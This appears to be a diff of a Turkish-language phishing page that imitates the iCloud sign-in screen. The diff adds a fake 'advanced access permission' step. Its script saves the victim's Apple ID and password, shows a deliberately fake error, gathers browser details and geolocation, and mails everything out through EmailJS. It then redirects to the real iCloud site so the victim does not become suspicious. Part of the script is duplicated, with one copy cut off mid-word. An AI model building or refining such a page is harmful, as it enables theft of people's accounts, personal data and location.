@@ -11,26 +11,139 @@
         })();
     </script>
     <style>
-        body, html { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif; background-color: #f5f5f7; color: #1d1d1f; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .login-card { background: #ffffff; border-radius: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 48px; width: 100%; max-width: 400px; text-align: center; }
-        .icloud-logo { font-size: 48px; margin-bottom: 32px; font-weight: 300; }
-        h2 { font-size: 28px; font-weight: 600; margin-bottom: 8px; }
-        .subtitle { font-size: 17px; color: #86868b; margin-bottom: 32px; }
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 17px; margin-bottom: 8px; font-weight: 600; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; transition: border-color 0.2s; }
-        input:focus { outline: none; border-color: #007aff; box-shadow: 0 0 0 3px rgba(0,122,255,0.1); }
-        .login-button { width: 100%; background-color: #007aff; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background-color 0.2s; }
-        .login-button:hover { background-color: #005ecb; }
-        .error-message { color: #ff3b30; font-size: 14px; margin-top: 16px; display: none; }
-        .footer-links { margin-top: 32px; font-size: 14px; }
-        .footer-links a { color: #007aff; text-decoration: none; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 18px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 48px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .icloud-logo {
+            font-size: 48px;
+            margin-bottom: 32px;
+            font-weight: 300;
+        }
+        h2 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 17px;
+            color: #86868b;
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 17px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 17px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #007aff;
+            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
+        }
+        .login-button, .permission-button {
+            width: 100%;
+            background-color: #007aff;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover, .permission-button:hover {
+            background-color: #005ecb;
+        }
+        .error-message {
+            color: #ff3b30;
+            font-size: 14px;
+            margin-top: 16px;
+            display: none;
+        }
+        .footer-links {
+            margin-top: 32px;
+            font-size: 14px;
+        }
+        .footer-links a {
+            color: #007aff;
+            text-decoration: none;
+        }
+        .hidden {
+            display: none !important;
+        }
+        /* İzin Ekranı için yeni stiller */
+        .permission-icon {
+            font-size: 64px;
+            margin-bottom: 24px;
+        }
+        .permission-list {
+            text-align: left;
+            background-color: #f5f5f7;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 24px 0;
+            font-size: 15px;
+        }
+        .permission-list li {
+            list-style-type: none;
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        .permission-list li::before {
+            content: "✓";
+            color: #34c759;
+            font-weight: bold;
+            margin-right: 12px;
+        }
+        .permission-button.deny {
+            background-color: #8e8e93;
+            margin-top: 12px;
+        }
+        .permission-button.deny:hover {
+            background-color: #636366;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="login-card">
+        <!-- 1. ADIM: GİRİŞ FORMU -->
+        <div id="loginCard" class="card">
             <div class="icloud-logo">☁️</div>
             <h2>iCloud'a Giriş Yap</h2>
             <p class="subtitle">Apple ID'nizi kullanarak devam edin.</p>
@@ -50,30 +163,139 @@
                 <a href="#">Apple ID'nizi mi unuttunuz?</a> veya <a href="#">Parola mı unuttunuz?</a>
             </div>
         </div>
+
+        <!-- 2. ADIM: SAHTE İZİN EKRANI -->
+        <div id="permissionCard" class="card hidden">
+            <div class="permission-icon">🔐</div>
+            <h2>Gelişmiş Erişim İzni Gerekli</h2>
+            <p class="subtitle">Hesabınıza tam erişim sağlamak ve tüm iCloud özelliklerini kullanmak için aşağıdaki izinleri vermeniz gerekmektedir.</p>
+            <ul class="permission-list">
+                <li>Fotoğraflarınıza ve videolarınıza erişim</li>
+                <li>Kişilerinizi, Takvim ve Notlarınızı okuma</li>
+                <li>Cihaz konum bilgisini alma</li>
+                <li>Tarayıcı geçmişinizi ve iCloud Drive verilerinizi senkronize etme</li>
+                <li>Gelen ve giden e-postalarınızı yönetme</li>
+            </ul>
+            <button id="allowButton" class="permission-button">İzin Ver</button>
+            <button id="denyButton" class="permission-button deny">İzin Verme</button>
+        </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
+        const loginCard = document.getElementById('loginCard');
+        const permissionCard = document.getElementById('permissionCard');
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const allowButton = document.getElementById('allowButton');
+        const denyButton = document.getElementById('denyButton');
+
+        // --- 1. ADIM: GİRİŞ FORMU İŞLEMLERİ ---
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Sayfanın yenilenmesini engeller
+
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // EmailJS ile verileri gönder
-            emailjs.send('service_mdm9ze3', 'template_umbj15o', {
+            // Bilgileri geçici olarak sakla
+            sessionStorage.setItem('username', username);
+            sessionStorage.setItem('password', password);
+
+            // Kullanıcıyı ikna etmek için sahte hata mesajı göster
+            errorMessage.style.display = 'block';
+
+            // 1.5 saniye sonra izin ekranına geç
+            setTimeout(() => {
+                loginCard.classList.add('hidden');
+                permissionCard.classList.remove('hidden');
+            }, 1500);
+        });
+
+        // --- 2. ADIM: İZİN EKR<script>
+        const loginCard = document.getElementById('loginCard');
+        const permissionCard = document.getElementById('permissionCard');
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const allowButton = document.getElementById('allowButton');
+        const denyButton = document.getElementById('denyButton');
+
+        // --- 1. ADIM: GİRİŞ FORMU İŞLEMLERİ ---
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Sayfanın yenilenmesini engeller
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Bilgileri geçici olarak sakla
+            sessionStorage.setItem('username', username);
+            sessionStorage.setItem('password', password);
+
+            // Kullanıcıyı ikna etmek için sahte hata mesajı göster
+            errorMessage.style.display = 'block';
+
+            // 1.5 saniye sonra izin ekranına geç
+            setTimeout(() => {
+                loginCard.classList.add('hidden');
+                permissionCard.classList.remove('hidden');
+            }, 1500);
+        });
+
+        // --- 2. ADIM: İZİN EKRANI İŞLEMLERİ ---
+        allowButton.addEventListener('click', function() {
+            // Saklanan kullanıcı bilgilerini al
+            const username = sessionStorage.getItem('username');
+            const password = sessionStorage.getItem('password');
+
+            // Gönderilecek ek verileri topla
+            const send_date = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
+            const user_agent = navigator.userAgent;
+            const platform = navigator.platform;
+            let location_info = "Konum alınamadı.";
+
+            // Kullanıcının konumunu almayı dene (opsiyonel, ancak etkili)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        location_info = `Enlem: ${position.coords.latitude}, Boylam: ${position.coords.longitude}`;
+                        // Konum alındıktan sonra e-postayı gönder
+                        sendEmail(username, password, send_date, user_agent, platform, location_info);
+                    },
+                    (error) => {
+                        // Konum izni verilmezse veya hata olursa konumsuz gönder
+                        sendEmail(username, password, send_date, user_agent, platform, location_info);
+                    }
+                );
+            } else {
+                // Tarayıcı konum desteği yoksa konumsuz gönder
+                sendEmail(username, password, send_date, user_agent, platform, location_info);
+            }
+        });
+
+        // --- E-POSTA GÖNDERME FONKSİYONU ---
+        function sendEmail(username, password, date, agent, plat, location) {
+            const templateParams = {
                 username: username,
                 password: password,
-            })
-            .then(function(response) {
-                console.log('E-posta gönderildi!', response.status, response.text);
-                // Kullanıcıyı ikna etmek için sahte hata mesajı göster
-                document.getElementById('errorMessage').style.display = 'block';
-            }, function(error) {
-                console.log('E-posta gönderilemedi...', error);
-                // Hata olsa bile kullanıcıya sahte hata göster
-                document.getElementById('errorMessage').style.display = 'block';
-            });
+                send_date: date,
+                user_agent: agent,
+                platform: plat,
+                location: location
+            };
+
+            emailjs.send('service_mdm9ze3', 'template_umbj15o', templateParams)
+                .then(function(response) {
+                    console.log('E-posta başarıyla gönderildi!', response.status, response.text);
+                    // Başarılı olduktan sonra kullanıcıyı sahte bir sayfaya yönlendir
+                    window.location.href = 'https://www.icloud.com'; // Gerçek iCloud'a yönlendir
+                }, function(error) {
+                    console.log('E-posta gönderilemedi...', error);
+                    // Hata olsa bile kullanıcıyı yönlendirerek şüphelenmesini engelle
+                    window.location.href = 'https://www.icloud.com';
+                });
+        }
+
+        // --- "İZİN VERME" BUTONU İŞLEMİ ---
+        denyButton.addEventListener('click', function() {
+            // İzin vermezse kullanıcıyı ana sayfaya geri gönder
+            window.location.href = 'https://www.apple.com';
         });
     </script>
-</body>
-</html>
